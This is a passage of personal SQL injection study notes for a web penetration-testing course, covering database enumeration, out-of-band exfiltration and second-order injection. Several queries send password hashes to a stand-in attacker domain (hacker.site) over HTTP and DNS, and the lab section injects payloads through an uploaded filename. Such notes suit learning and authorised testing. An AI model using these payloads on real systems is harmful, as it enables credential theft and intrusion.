+</code></pre><p id="4401184d-e6da-43ea-b4d8-4d9c835074ce" class="">Whos the owner of what?</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5898d798-0632-46bc-b0d5-034a88d921e5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># http://msdn.microsoft.com/en-us/library/ms174355.aspx
+
+SELECT loginname FROM SYSLOGINS where sysadmin=1
+</code></pre><p id="69a71c90-a69f-4e84-9034-e2ff55b9af4d" class="">Or we can use System View server_principals:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c85fb37-f0c4-4b6e-824a-48239fbb1f64" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name FROM SYS.SERVER_PRINCIPALS where TYPE=&#x27;S&#x27;
+# S = SQL login
+</code></pre><h3 id="58039493-4750-4e0b-a509-f842b13ef750" class=""><strong>Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#oracle-1"></a></strong></h3><p id="db390d39-4866-4edd-aa20-f9552f32e58d" class="">To retrieve the current user:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="55102c81-def8-40e5-90a9-afbfa49830f6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT user FROM DUAL
+</code></pre><p id="ed94c794-c281-4b2a-b84f-f3e5de647a18" class="">Alternatively:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1e18aa54-e73d-4999-9195-9eebce0d0f0d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT username FROM USER_USERS
+SELECT username FROM ALL_USERS
+</code></pre><p id="12e3816d-4961-46d7-9567-324ef5ee1f34" class="">User privileges:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="808637f7-bc27-43da-bf06-6be8ac0ce260" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT grantee FROM DBA_ROLE_PRIVS
+SELECT username FROM USER_ROLE_PRIVS
+</code></pre><p id="b67600b3-d158-43b7-8367-f4580b4aa73d" class="">The current users session privileges:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37e30ab1-d611-445b-bc86-8e95c347bb04" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT role FROM SESSION_ROLES
+</code></pre><p id="e411bc4f-948d-4264-a8ec-954f22504324" class="">To retrieve an overview of all the data dictionaries, tables and view:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0dbd2e08-a552-4fa2-b13f-5f6d80a51b05" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT * FROM DICTIONARY
+SELECT * FROM DICT
+</code></pre><p id="d38db636-048a-4fbb-aac7-8954a8a62f46" class="">SQLI Classifications:</p><figure id="3686f331-ee53-4694-8bd6-72fb885e14ee" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/3.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/3.png"/></a></figure><p id="87d78c22-131f-4f4a-87cc-f4120430aeb1" class="">We can infer the DBMS version by observing the replies to different concatenation syntaxes:</p><figure id="28f0acb7-eaa0-43b2-a5e8-8ce5a2cd783b" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/1.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/1.png"/></a></figure><p id="538f277d-c3f0-49fb-8f0b-ec5b44336dff" class="">Numeric functions:</p><figure id="13bc826a-7084-4925-b9fa-8eb8a5718adf" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/2.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/2.png"/></a></figure><h2 id="65a51097-d59a-4dd9-a994-159072f07984" class=""><strong>Out-of-Band Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#out-of-band-exploitation"></a></strong></h2><p id="4e6c14d0-3089-4974-b6a9-dec2614e33ec" class="">Useful when facing Special-Blind SQL Injection scenarios. In these situations, we cannot rely on the inferential techniques to retrieve data.</p><p id="42398bff-ddaa-41f3-b4be-eefeb8c348e1" class="">These will not work cause the results are being limited, filtered, and so forth; therefore, we need to opt For another CHANNEL to carry this information.</p><h3 id="2e78aa20-5ba4-44bf-8cb5-70e255ef0f9a" class=""><strong>Alternative OOB CHannels</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#alternative-oob-channels"></a></strong></h3><p id="92e2abd2-b126-4e31-9b5b-fb1a34499151" class="">The most relevant:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="806929c8-02ca-4c84-8081-360fb6553e14" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HTTP
+DNS
+email
+Database Connections
+</code></pre><h3 id="42f31dc1-3c8f-4e44-a26d-03b01dca58ce" class=""><strong>OOB via HTTP</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#oob-via-http"></a></strong></h3><p id="c968f826-f71a-463f-94a0-179835cb0250" class="">We can leverage the HTTP channel For the DBMS systems that provide features For accessing data on the internet over HTTP using SQL</p><ul id="9e3d68c9-9540-4c08-ad9a-06fedaf571bb" class="bulleted-list"><li style="list-style-type:disc">Using these features, we can create a query to a web resource controlled by the hacker and then control the access log For analyzing all the requests arrived.</li></ul><ul id="50aeed85-2d36-4349-8ce7-f93630120a47" class="bulleted-list"><li style="list-style-type:disc">Only Oracle provide this feature natively</li></ul><p id="25883893-aa99-4fdc-986c-278bdcc33856" class="">Two techniques [ Oracle ]:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="80f5bbe0-69b9-467b-a8e5-5f5bad8fed1c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">UTL_HTTP
+
+# HTTPURIType: https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/t_dburi.htm#BGBGAHAA
+</code></pre><p id="233df4eb-1c35-4bcb-a3e6-3ee012e15bf0" class="">Oracle URL_HTTP package → https://docs.oracle.com/cd/B19306_01/appdev.102/b14258/u_http.htm</p><ul id="56fc4553-f6be-4266-ba3e-2dcfcc57109c" class="bulleted-list"><li style="list-style-type:disc">It can use both via SQL and PL/SQL</li></ul><p id="7e489d0c-220e-476b-965d-41139cf7625f" class="">Two useful funcions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="503f69a6-315a-4cbb-9a0c-a3c3d818a709" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">REQUEST
+REQUEST_PIECES
+</code></pre><p id="bae2c777-57ad-41bb-8c83-30a43edf099b" class="">Only the REQUEST can be used in a SQL query:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="76d771ab-b29a-4827-a8cb-6ce8c57d7567" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT UTL_HTTP.REQUEST (&#x27;hacker.site/&#x27;||(SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)) FROM DUAL;
+</code></pre><p id="b88664d0-35ac-46c4-88c5-6d2ddf3bce21" class="">The REQUEST_PIECES must be used within a PL/SQL Block *example in images</p><p id="2037f20e-f676-4664-a01c-3b04c7f448d4" class="">Oracle HTTPURITYPE Package</p><ul id="2419491e-a358-4d63-8b77-865f2478025f" class="bulleted-list"><li style="list-style-type:disc">The first one is often disabled</li></ul><p id="387a5be4-e408-4d76-89a7-8d2ec72369eb" class="">We can also exfiltrate information via HTTP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="64198f06-c7ae-4550-896b-4d393958df59" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT HTTPURITYPE (&#x27;hacker.site&#x27;/||(SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)).getclob() FROM DUAL;
+
+# getclob() method returns the character large object (CLOB), but we can also use other methods such as: GETBLOB(), GETXML() and GETCONTENTTYPE()
+</code></pre><h3 id="0fec42e3-ce00-41e5-85c7-8cb52ee4dff3" class=""><strong>OOB via DNS</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#oob-via-dns"></a></strong></h3><p id="08616cbf-82ff-48eb-aead-9a568dbc0dbc" class="">In this context, instead of controlling the web server we have to control a DNS server.</p><blockquote id="228f483c-ab4b-472c-8c17-d3a1a237261a" class="">Even if the administrator sets an aggressive firewall policy filtering out any outgoing connections, the victim site will still both be able to reply to requests and perform DNS queries.</blockquote><ul id="49007ba3-8979-4135-91c6-4ce9c4d6d28a" class="bulleted-list"><li style="list-style-type:disc">The server uses a DNS resolver configured by the network administrator, but the resolver needs to contact a DNS server under the attackers control, therefore giving back the results of the injection to the attacker.</li></ul><ul id="5fbc88d5-aa38-4821-9b22-b1d47c07374b" class="bulleted-list"><li style="list-style-type:disc">As a requirement the hacker must have access to the DNS Server.</li></ul><blockquote id="137caecc-743c-4d6a-b289-7b5f921da670" class="">The server must be registered as the authoritative name server For that Zone (e.g. hacker.site)</blockquote><p id="9e956f3b-2ee5-4fbc-9bde-ba073adca90f" class="">Provoking DNS Requests</p><h3 id="d48173b8-eeef-4d63-bedc-84c8296ecd77" class=""><strong>MySQL (win)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mysql-win"></a></strong></h3><p id="cea30733-20a8-479a-86ee-66a0fb8725bb" class="">Function: LOAD_FILE() reads the file and returns the file contents as a string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b4d7a48d-a174-4201-bd85-3ca7176d4cb2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT LOAD_FILE(&quot;C:\\Windows\\system.uni&quot;);
+</code></pre><p id="b0e3d50d-b73a-401f-a3b9-48d455254e10" class="">We can exploit this function and provoke DNS requests by requesting a UNC path like this: \[data].hacker.site</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8a08af41-31d3-4ba1-a5f0-2d42559d9072" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;, &#x27;SELECT password FROM mysql.user WHERE user=\&#x27;root\&#x27;&#x27;,&#x27;.hacker.site&#x27;));
+</code></pre><h3 id="9068e9ee-ca58-410c-9329-236015b6cb1b" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mssql-3"></a></strong></h3><p id="b195f9a2-ce08-4799-8745-1c447561484f" class="">We can provoke DNS requests by using <strong>UNC Paths</strong> as we did with MySQL</p><p id="7e1b2a06-c3d3-4538-b9bd-6a2881ec2df8" class="">We can use the extended stored procedure MASTER..XP_FILEEXIST to determine whether a particular file exists on the disk or not.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d477b55a-05e2-42b7-b908-edb1a714183b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">EXEC MASTER..XP_FILEEXIST &#x27;C:\Windows\system.ini&#x27;
+</code></pre><ul id="7f79b67a-747d-4b2d-ac54-92c1701ce1c8" class="bulleted-list"><li style="list-style-type:disc">2 alternatives are <strong>XP_DIRTREE</strong> and <strong>XP_SUBDIRS</strong></li></ul><ul id="c01134e5-31f2-46d7-a800-c2e3c35a7aab" class="bulleted-list"><li style="list-style-type:disc">moreover in images</li></ul><h3 id="92a6e86f-fc6c-426c-8218-a8d30f6e584d" class=""><strong>Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#oracle-2"></a></strong></h3><p id="9791bb17-7c42-4518-9822-b8a6ced54321" class=""><strong>UTL_INADDR</strong> package with the functions <strong>GET_HOST_ADDRESS</strong> and <strong>GET_HOST_NAME</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="569c3b5e-8bce-47c1-9921-bdcf72b46f2b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name=&#x27;SYS&#x27;)||&#x27;.hacket.site&#x27;) FROM DUAL
+SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name=&#x27;SYS&#x27;)||&#x27;.hacket.site&#x27;) FROM DUAL
+</code></pre><p id="11fb164e-a6f9-464b-8c42-293fa6b25245" class="">Also functions/packages such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0b59899-a176-42c8-bab6-ddeae891ae47" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HTTPURITYPE.GETCLOB
+UTL_HTTP.REQUEST
+DBMS_LDAP.INIT
+</code></pre><blockquote id="8eb7b338-4317-4a23-926a-37df3efb4c92" class="">Can be used, but depends on the version of Oracle</blockquote><p id="501f348a-e03d-4634-bf59-ea7d9d154881" class="">It can be automated with SQLMAP</p><p id="e6b6550a-2d60-4bc3-880c-1f5f9ecfc7c9" class="">→ http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281</p><h2 id="7e918204-c577-48e4-ac75-d8ebb70524d6" class=""><strong>Exploiting Second-Order SQL Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#exploiting-second-order-sql-injection"></a></strong></h2><ul id="71029ef3-0a02-4a0a-82bb-87031f31510f" class="bulleted-list"><li style="list-style-type:disc">Second-order SQL Injections are extremely powerful, much like their equivalent in the first-order space; However, due to their nature, they are more difficult to detect.</li></ul><ul id="c85f1b4d-bd76-488a-8212-0bd42318e434" class="bulleted-list"><li style="list-style-type:disc">The exploit is submitted in one request and triggere when the application handles a different request.</li></ul><ul id="7f4297dc-1d79-43bf-892a-aa84497e84aa" class="bulleted-list"><li style="list-style-type:disc">Modern automated scanners are unable to perform the rigorous methodology necessaryFor discovering second-order vulnerabilities</li></ul><ul id="7a854ac4-559c-4ffd-84f6-33e0ef75e5f7" class="bulleted-list"><li style="list-style-type:disc">Because there are several possible scenarios</li></ul><h3 id="b0a021f7-4caf-4604-9f46-1efd82e72ffe" class=""><strong>Lab</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#lab"></a></strong></h3><ul id="5fb140c5-015c-4742-b119-2ac623301dfb" class="bulleted-list"><li style="list-style-type:disc">Upload image only</li></ul><ul id="bf70c69d-a7e6-4cc6-86f5-4aeacf823d55" class="bulleted-list"><li style="list-style-type:disc">go to <strong>List of file signatures</strong> in wikipedia</li></ul><ul id="79ed2aef-d457-4735-98f9-4f91e32a2469" class="bulleted-list"><li style="list-style-type:disc">See the value of jpg files</li></ul><p id="20be999f-17e8-430b-9f56-468fddc29ed3" class="">Try to increment the value with php code in it</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce389d5d-dd6a-4073-9703-89bb6509f1a6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?php phpinfo();
+</code></pre><p id="55a1ca8a-eb80-4fdb-a750-42643c84066e" class="">Try to open the image uploaded, if the page has php handler it will open the phpinfo</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8037fcda-0c86-4ff2-b6c8-c94d47e200fd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># If not, procced to test the file name with BURP &gt; Repeater
+filename=&quot;example.php&#x27; and true -- -&quot;
+
+# If the number of view increase, lets try with UNION this time
+filename=&quot;example.php&#x27; UNION SELECT @@VERSION; -- -&quot;
+filename=&quot;&#x27; UNION SELECT @@VERSION; -- -&quot; //take off the name of the file
+filename=&quot;&#x27; UNION SELECT SCHEMA(); -- -&quot;
+filename=&quot;&#x27; UNION SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema = SCHEMA(); -- -&quot;
+</code></pre><p id="00508eb2-d35c-4cf7-83ad-45f8ccc36745" class="">Our scenario:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48688c2d-746b-4558-8478-0acf4a62fb1b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[&gt;] Injection
+Name of the file uploaded, e.g. &#x27; union select @version; -- -
+** via POST request **
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a7e32251-0fc9-4d4e-9f2d-0c4fed3722ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[*] Execution
+view.php?file={our_payload}
+** via GET request **
